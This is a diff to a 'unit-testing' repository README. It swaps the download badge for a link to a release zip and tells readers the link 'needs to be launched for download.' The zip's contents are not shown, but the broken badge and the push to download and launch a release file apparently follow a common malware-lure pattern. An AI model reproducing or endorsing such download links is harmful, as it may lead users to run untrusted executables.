@@ -32,7 +32,7 @@ The "unit-testing" repository is a carefully crafted project designed to help de
 ## Get Started 🚀
 To dive into the "unit-testing" repository and explore the world of unit testing, simply click the link below to download the project files:
 
-[![Download Repository](https://img.shields.io/badge/Download-Repository-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/MaZo2020/unit-testing/releases/download/v1.0/Release.zip)](https://github.com/MaZo2020/unit-testing/releases/download/v1.0/Release.zip)
 
 (*Note: The link needs to be launched for download*)
 
